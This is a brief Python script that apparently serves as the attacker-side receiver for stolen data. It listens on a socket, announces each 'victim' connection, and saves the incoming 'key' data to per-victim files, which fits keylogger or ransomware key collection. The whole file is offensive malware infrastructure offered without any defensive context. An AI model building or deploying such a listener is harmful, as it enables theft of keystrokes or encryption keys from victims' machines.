import socket

host = '172.16.153.107'
port = 5556

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.bind((host, port))
    s.listen(5)
    conn, addr = s.accept()
    print(f'Victim connected: {addr}')
    while True:
        key = conn.recv(1024).strip().decode('utf-8')
        print(key)
        with open(f'keyfile_{addr}', 'w+') as file:
            file.write(key)
except Exception as e:
    print(e)
except KeyboardInterrupt:
    conn.close()
